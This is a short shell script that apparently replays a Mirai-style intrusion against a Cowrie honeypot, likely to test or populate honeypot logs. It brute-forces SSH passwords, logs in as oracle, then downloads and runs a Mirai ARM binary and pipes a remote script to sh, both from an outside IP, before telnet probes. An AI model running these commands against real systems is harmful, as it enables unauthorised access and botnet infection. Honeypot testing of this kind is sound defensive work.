# Mirai-style bot: fail common passwords, get in as oracle, drop and run a payload.
for pw in $FAIL_PW; do sshpass -p "$pw" ssh -p "$SSH_P" root@"$COWRIE" true 2>/dev/null; done
sshpass -p oracle ssh -p "$SSH_P" oracle@"$COWRIE" "
  busybox; cat /proc/mounts; cat /proc/cpuinfo | grep -c processor;
  cd /tmp; wget http://45.9.148.99/bins/mirai.arm7 -O .x; chmod +x .x; ./.x;
  curl http://45.9.148.99/w.sh | sh; rm -rf /tmp/.x" 2>/dev/null
for i in 1 2 3; do nc -w2 "$COWRIE" "$TELNET_P" </dev/null; done
